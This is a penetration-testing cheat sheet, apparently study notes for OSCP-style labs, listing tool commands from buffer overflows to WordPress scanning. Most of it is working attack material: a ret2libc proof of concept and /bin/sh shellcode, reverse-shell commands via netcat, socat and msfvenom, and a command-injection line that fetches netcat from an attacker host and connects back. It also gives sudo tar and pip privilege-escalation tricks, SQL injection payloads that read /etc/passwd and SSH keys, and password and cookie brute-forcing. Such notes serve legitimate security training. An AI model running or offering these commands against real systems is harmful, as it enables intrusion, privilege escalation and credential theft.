OSCP Guide: https://sushant747.gitbooks.io/total-oscp-guide/


ASCII,Hex,Binary,Decimal,Base64 converter:
  https://gchq.github.io/CyberChef/
  https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html

Buffer Overflows:
	commands gdb:
		gdb -q binary
		gdb> disassemble main (check for stack sub)
		gdb> disassemble function

	Guides/Intro:
		https://github.com/Bretley/how2exploit_binary
		https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
	getting payload from stdin: https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection
	shellcodes:
		https://www.exploit-db.com/shellcodes
	using strace:
		strace ./overflow2 $(python -c 'print "A"*32')
	using ltrace:
		ltrace /path/to/binary
	echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
	vulnerable functions:
		https://security.web.cern.ch/security/recommendations/en/codetools/c.shtml
	/usr/share/metasploit-framework/tools/exploit
		$ ./pattern_create.rb -l <pattern-length>
		$ (gdb) run <pattern>		(crash program)
		$ (gdb) info registers 		(find eip)
		$ pattern_offset.rb -q <eip-hex-value> -l <pattern-length>

	check for system calls:
		$ ldd <binary>
		$ readelf <linked-library> | grep system (e.g. libc)
	ret2libc attack (bypass ASLR (32-bit) & use libc to execute /bin/sh)
		https://www.ret2rop.com/2018/08/return-to-libc.html
	ret2libc 64-bit: 
		https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/

	re2libc Concept:	
 	ldd <binary> (search for libc address)
 	readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system 	(search for system address)
 	readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit (search for exit address)
 	strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh  (search for /bin/sh)
 	system>exit>/bin/sh 
	
	re2libc poc (fill hex with 0s until 8 hex):
	import struct
	buf = "A" * <pattern-offset-found>
	libc_addr = <libc_addr>
	sh_addr = struct.pack('<I', libc+addr + <sh_addr>)
	system_addr = struct.pack('<I',libc_addr + <system_addr>)
	exit_addr = struct.pack('<I', libc_addr + <exit_addr>)
	payload = buf + system_addr +exit_addr + sh_addr
	print payload

	/bin/sh shellcode:
		 "\x31\xc0\x50\x68\x2f\x2f\x73"
			   "\x68\x68\x2f\x62\x69\x6e\x89"
			   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
			   "\xcd\x80\x31\xc0\x40\xcd\x80";


Command injection examples:
	Upload netcat to victim: cd /tmp; wget http://<kali>/nc; chmod 777 ./nc; ./nc <kali> <port>
	
Dirb:
	dirb http://<target> <wordlist>
	dirb http://<target> -X <extension> 	(e.g. .asp or .aspx)
	dirb http://<target> -w <wordlist> -f -e extension1,extension2 -x 400
	dirb http://<target> -p <proxy:port> -P <proxy_user:proxy_pass> -r

Dirbuster:
	dirb gui
	can check response size differences
	generates directory tree graphical

DNS enum:
	host -l <ip> <domain-name>
	dig axfr @<ip> <domain>   (zone transfers)
	Search or subdomains: 
	wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt -u https://<target> -H "Host: FUZZ.<domain>" --hw <words> --hc <code>

Encryption/Decryption/Steganography
	pgp encryption:
		gpg --list-keys
		gpg -d file.gpg
	ssh2john
		https://fossies.org/linux/john/run/ssh2john.py
		$ python ssh2john.py id_rsa > ssh_login
		$ john ssh_login --wordlist=/usr/share/wordlists/rockyou.txt
	$ locate *2john
	$ ssh -i id_rsa <user>@<address> 	(login with private key)
	Openssl newer version problems:
		bypass ssl connect error through burp proxy: 
			msf> set Proxies http:127.0.0.1:8080
	Steganography:
		$ steghide –-info image.jpg
		$ steghide extract -sf image.jpg
		Strings an image for hidden content:
			$ strings image.jpg

Filebuster:
	https://github.com/henshin/filebuster

Ftp:
  lftp:
  	$ lftp Anonymous@<target>
  ftp:
  	$ apt install ftp
	$ ftp <target>
		ftp> get "file"
  wget:
	  $ wget -r ftp://<target>

Gobuster:
	gobuster -e -u http://<target>/ -w <wordlist>
	gobuster -e -u http://<target>/ -w <wordlist> -s '200,204,301,302,307,403,500' (status codes)
	recursive-gobuster:
		https://github.com/epi052/recursive-gobuster
		recursive-gobuster.pyz -d http://<target>:<port>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 20 | tee gobuster/directories

Masscan:
  $ masscan -p1-65535 <target> --rate=1000 -e <interface> > file
  $ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//' )
  $ nmap -Pn -sV -sC -p $ports <target>

Metasploit/Meterpreter:
	pre-start:
    		$ msfdb init
    		$ systemctl enable postgresql
  	db_nmap:
    		# Use workspaces to separate different scans
    		msf> workspace --add <name>
    		msf> db_nmap -Pn -pn -n -v <target>/<cidr>
    		msf> db_nmap -sV -sC -Pn -n -v -p <port-list> <target>
    		# identified services and hosts are saved in the workspace
    		msf> services
    		msf> hosts
	post exploit “Multi Recon Local Exploit Suggester”: 
		msf> use post/multi/recon/local_exploit/suggester
		msf> set session <id>
		msf> run
	Download files from victim:
		msf> download /path/to/file /local/path
	Migrate:
		1.
		meterpreter> ps -S <process name>
		meterpreter> ps
		meterpreter> migrate <pid>
		meterpreter> migrate <pid> -t <seconds>
		2.
		use post/windows/manage/migrate
		msf post(windows/manage/migrate)>set session 1
		msf post(windows/manage/migrate)> run
	Interactive shell (if shell command doesnt work):
		meterpreter> execute -i -f /bin/bash
	Web delivery exploit: (upgrade shell to meterpreter with target PSH)
		msf> use exploit/multi/script/web_delivery (run a server that will upload a payload to victim, command to run at victim shown after running exploit)
		msf> exploit(multi/script/web_delivery) set target 1 (2 - powershell: good way to spawn a meterpreter shell from another shell)
		msf> exploit(multi/script/web_delivery) set payload php/meterpreter/reverse_tcp
		msf> exploit(multi/script/web_delivery) set lhost <kali>
		msf> exploit(multi/script/web_delivery) set lport <port>
		msf> exploit(multi/script/web_delivery) exploit
	Powershell meterpreter:
		meterpreter> load powershell
		meterpreter> powershell_shell
	SMB meterpreter delivery (from an already obtained non meterpreter shell):
		msf> use exploit/windows/smb/smb_delivery
		msf> set SRVHOST <kali>
		msf> set payload windows/x64/meterpreter/reverse_https
		msf> set LPORT 443
		msf> set LHOST <kali>
		msf> exploit (run command created to victim)
	SMB delivery 2:
		msf> user exploit/windows/smb/smb_delivery
		msf> set SRVHOST <kali>
		msf> set payload windows/meterpreter/reverse_tcp
		msf> set LHOST <kali>
		msf> set LPORT <port>
		msf> exploit
		- run command on victim through some way (e.g. already obtained web-shell)
		- get shell
	Route must be added if SMB is not open to the network
		msf> route add <target>/32 255.255.255.255 <session-id>
		msf> use auxilliary/admin/smb/psexec_command
		msf> set COMMAND C:\path\to\nc64.exe <kali-ip> <port> -e cmd.exe
		msf> set SMBPass <admin-pass>
		msf> set SMBUser Administrator
	wordpress reverse shell plugin upload:
		msf> use exploit/unix/webapp/wp_admin_shell_upload
		msf> set rhost <target>
		msf> set username <username>
		msf> set password <pwd>
		msf> exploit
Msfvenom:
	msfvenom -p php/meterpreter/reverse_tcp lhost=<kali-ip> lport=<port> -f <format> > file
	msfvenom --list archs
	msfvenom --list formats
Msfvenom (buffer overflow, embedded payload):
	msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp lhost=<lhost> lport=<lport> -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
	msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp lhost=<lhost> lport=<lport> -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
	msfvenom -p python/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/python.py
	msfvenom -p php/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f raw > file.php
	
Netcat:
	nc -nvlp <port>				(listen)
	nc  <address> <port> -e /bin/bash	(connect)
	nc.exe <address> <port> -e cmd.exe	(connect windows)

Nmap:
  basic scans:
    $ nmap -Pn -n -v <target>/<cidr>
    $ nmap -sS -Pn -n -p- <target>
    $ nmap -sV -sC -Pn -n -v -p port1,port2,..portN <target>
  http:
    $ nmap -sV -p 80 --script http-methods,http-enum <target>
  nmap automator:
    https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh

Nikto:
	nikto -h <address>
	nikto -h <address> -p <port>
	nikto -h https://<address>:<port>/
	nikto -h <address> -p <port> -ssl

Password Cracking:
  https://hashkiller.co.uk/
  https://crackstation.net/
  Samdump2:
  	samdump2 [-d] [-o file] <system hive> <sam hive>
	example: samdump2 -o out /mnt/ntfs/WINDOWS/system32/config/SYSTEM /mnt/ntfs/WINDOWS/system32/config/sam

PHP
	PHP web shell:
		https://github.com/Arrexel/phpbash
	PHP disabled functions: (could give a shell)
		phpinfo();
		disable_functions =>exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
	PHP list directories and read file contents:
		scandir("/home/user");
		file_get_contents("/home/user/file.txt")
		file_get_contents("http://10.10.16.66:8000/remote-file.txt")

Powershell:
	systeminfo
	whoami /priv
	Download with certutil to victim:
		certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe
	Download file:
		Invoke-WebRequest -Uri $url -OutFile $output
	List installed software:
		REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
	Search for keywords in files:
		Get-ChildItem -Path (Your Path) -Recurse -File | Select-String (Keyword)
Powersploit privilege escalation:
	https://github.com/PowerShellMafia/PowerSploit/
	powershell -ExecutionPolicy Bypass 	 	(run ps1 scripts)
	Import-Module ./PowerUp.ps1 			(after uploading to victim)
	Invoke-AllChecks 				(run all priv esc checks)
	Get-RegistryAutoLogon				(reveal administrator autologon credentials in memory)

Privilege Escalation:
	Windows:
		https://medium.com/@rahmatnurfauzi/windows-privilege-escalation-scripts-techniques-30fa37bd194
	Linux Enumeration:
		id (check userid and groups)
		groups
		sudo -l 	(list commands)
		sudo -i 	(root shell)
		sudo -u <user> <command>
		1. https://github.com/diego-treitos/linux-smart-enumeration
		2. https://github.com/rebootuser/LinEnum *** most common ***
		3. https://github.com/mzet-/linux-exploit-suggester
	vim.tiny:
		# Press ESC key
		:set shell=/bin/sh
		:shell
	tar:
	a) sudo -u <username> tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=sh
	b)
		kali:
		msfvenom -p cmd/unix/reverse_netcat lhost=<kali> lport=<port> -f raw
		victim:
			mkdir dir
			cd dir
			echo "<reverse_netcat payload>" > test.sh
			echo "" > "--checkpoint-action=exec=sh wp.sh"
 			echo "" > --checkpoint=1
 			sudo -u <user> /bin/tar cf archive.tar *
	Cronjob exploitation:
		wrong rights, wildcard exploit, runparts
	Relative path exploitation:
		relative path to a program run by root can be changed if PATH variable finds another program first (e.g. reverse shell first)
	SUID enum:
		find / -perm -u=s -type f 2>/dev/null
		doas command: similar to sudo
	getcap: get file capabilities https://www.insecure.ws/linux/getcap_setcap.html
		getcap -r / 2>/dev/null
	sudo pip install privilege escalation:
		python reverse shell from pentest monkey > setup.py
		kali: nc -nvlp 1234
		victim: sudo pip install .
	
Python http server module (for file uploads to victim):
	python -m SimpleHTTPServer 8000

Reverse shells:
	http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
	http://pentestmonkey.net/category/tools/web-shells

Searchsploit:
  $ searchsploit -m <exploit-pattern>

Shells (spawn & upgrade):
	1. with python: 
		$ python -c "import pty;pty.spawn('/bin/bash')"
	2. with perl:
		$ sudo /usr/bin/perl -e 'exec "/bin/sh"'
	3. with socat: https://github.com/aledbf/socat-static-binary/releases
		kali: socat -,raw,echo=0 tcp-listen:4444
		victim: ./socat exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane tcp:<host>:<port> (upload socat binary locally)	
	4. Fully interactive shell: https://www.boiteaklou.fr/Fully-interactive-reverse-shell.html
		steps:
		a. spawn pty: $ python -c 'import pty; pty.spawn("/bin/bash");'
		b. Resizing and tab completion:
		- Background your reverse shell with CTRL+Z.
		- Print the size of your host terminal: stty -a |cut -d';' -f2-3 | head -n1.
		- Transfer local hotkeys to the remote shell: stty raw -echo
		- Bring the reverse shell back to foreground: fg. You may need to hit ENTER after this command.
		- Inside the remote shell, adjust the size: stty rows <ROWS> cols <COLS>.
		c. Adding some color: export TERM=xterm-256color

SFTP:
	$ sftp user@<target>
		sftp> get/put <file>
	  sftp> symlink /etc/passwd/ passwd

SMB:
  discovery:
  	use auxiliary/scanner/smb/smb2
	use auxiliary/scanner/smb/smb1
	use auxiliary/scanner/smb/smb_version  
  get share list:
  	$ smbclient -L <target>
  	$ smbclient -L <target> -U <user>
  	$ enum4linux -S <target>
  Connect:
	  $ smbclient //<target>/<share>
	  $ smbclient \\\\<target>\\<share>
    $ smbclient //<target>/<share> -U <user>
	  smb> get <file> -	(read a file)
	  smb> get "<file>"	(download)
  Eternalblue scan:
	nmap --script vuln -p445 <target>
  impacket smbclient:
	./smbclient.py user:password@<target>

SMTP
swaks: https://linux.die.net/man/1/swaks
	the Swiss Army Knife SMTP all-purpose smtp transaction tester 
	used to deliver the malicious file
	$ swaks --to nico@megabank.com --server 10.10.10.77 --attach /root/.msf4/local/shell.rtf
SMTP enum:
	telnet <address> 110
	user <username>
	pass <password>
	retr 1
	retr 2
SMTP enum 2:
	telnet <address> 25
	HELO anything here
	VRFY nico@megabank.com
	MAIL From: <email>
	RCPT To: <email>
	QUIT
Python SMTP module
	import smtpd
	import asyncore
	server = smtpd.DebuggingServer(('0.0.0.0',25),None)
	asyncore.loop()
POP3/IMAP:
	ports: 110/143
	ssl ports: 993/995
	connect to imap with openssl:
		openssl s_client -connect 10.10.10.120:993
			a login "user" "password"
		View Inbox/Drafts/Sent:
			a select Drafts
			a select Inbox
			a select Sent
		Read a mail from Drafts:
			a select Drafts
			a FETCH 1 BODY[]

SQLi Manual (mysql)
	Filter e.g. : union and UNION , but not uniOn
	
	' or 1=1 -- 					(view all database info)
	' or 1=1 -- -
	' or 1=1#
	
	' UNION SELECT 1,2,3,4#				(enumerate columns)										
	' UNION SELECT null,null,null,@@version#	(version info: e.g. ubuntu 14.04)
	' UNION SELECT null,null,null,database()#	(database name)
	' UNION SELECT null,null,null,user()#		(user: e.g. root@localhost)								' UNION ALL SELECT null,null,null, table_name FROM information_schema.tables # 	(table name: e.g. users)
	'+UNION+select+1,2,TABLE_SCHEMA,4,5+FROM+INFORMATION_SCHEMA.COLUMNS;+--+-
	' UNION ALL SELECT null,null,null, column_name FROM information_schema.columns where table_name='users' # (table columns: e.g. username, password)
	' union all select null,null,username,password from users #
	' union all select null,null,null, load_file("/etc/passwd") # 	(view /etc/passwd)	
	' union all select 1,"test",3,4 into outfile '/tmp/test.txt' # 	(write a test file)

SQLmap:
SQLmap (get)
	sqlmap -u "http://<target>link.php?VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue"  --dbs
SQLi WAF bypass with delay:
	intercept request with burp -> right click -> save to file, then:
	sqlmap -r app.request --delay=1 --batch --dump
SQLmap (post)
	sqlmap -u "http://<target>/link.php" --data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --banner
	sqlmap -u "http://<target>/link.php" -data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbms
	sqlmap -u "http://<target>/link.php" -data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbs
	sqlmap -u "http://<target>/link.php" --data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbms=<dbms> -D <database> --tables
	sqlmap -u "http://<target>/link.php" --data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbms=<dbms> -D <database>  -T <table> --columns
	sqlmap -u "http://<target>/link.php" --data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbms=<dbms> -D <database>  -T <table> -C <column1>,<column2> --dump
SQLmap request (aggressive):
	1. sqlmap -r sqlmap.req --level=5 --risk=3 --dump-all
	2. sqlmap -u http://<target>/login.php --forms --level 5 --risk 3 --string "Wrong identification" --dbs --batch
SQLmap (Rest API)
	sqlmap --url=http://10.10.10.96/users/*
	sqlmap --sql-shell --url=http://10.10.10.96/users/*
		sql-shell> SELECT hex(load_file('home/user/.ssh/id_rsa')) 

Webshells:
	/usr/share/webshells

Wfuzz POST & GET:
	FUZZ keyword
	-hw (wide answers based on word length)
		wfuzz -w wordlist.txt -L 20 -d "username=alex&password=FUZZ" http://<target>/login.php
		wfuzz -w wordlist.txt -L  http//<target>/login.php?username=<user>\&password=FUZZ
	-hh: hide responses with content-length number
		wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://<target>/sync?FUZZ=ls -c --hh 19
		wfuzz -u http://<target>/path/FUZZ -w /usr/share/dirb/wordlists/common.txt
	WFUZZ Brute force a cookie: (--hw: hide words)
		wfuzz -c --hw=<words> -w /usr/share/SecLists/Passwords/darkweb2017-top1000.txt-H "Cookie: <cookie_name>=FUZZ" http://<target>:<port>

Wordlists:
	kali: /usr/share/wordlists
	https://github.com/danielmiessler/SecLists.git
Wordlist generation:
	cewl <target> > wordlist.txt
	crunch (generate based on charset, min, max number of chars)
		crunch <min-chars> <max-chars> <charset> -o output.txt
		crunch 15 15 -t Th4C00lTheacha^ -o pass.txt
			-t (literal)
				@: lower
				,: upper
				%: numbers
				^: symbols

Wordpress:
Wordpress aggressive scan (most likely to find vulnerable plugins etc.):
	$ wpscan --url http://<target>/wp/ enumerate p --wp-content-dir wp-content --wp-plugins-dir wp-content/plugins --random-user-agent --stealthy --force --plugins-detection aggressive
wordpress: enumerate plugins, themes, users, disable ssl cert check
	$ wpscan --url https://domain/ --disable-tls-checks --enumerate p --enumerate t --enumerate u
	$ wpscan –-url http://<target> --usernames <username> --passwords <wordlist>
wordpress database user and password configuration:
	/var/www/html/wordpress-<version>/wp-config
wordpress login:
	http://<target>/wp-login.php
wordpress plugin location:
	http://<target>/wp-content/plugins/<plugin-name>
wordpress theme location:
	http://<target>/wp-content/themes/<theme-header>/<template>.php
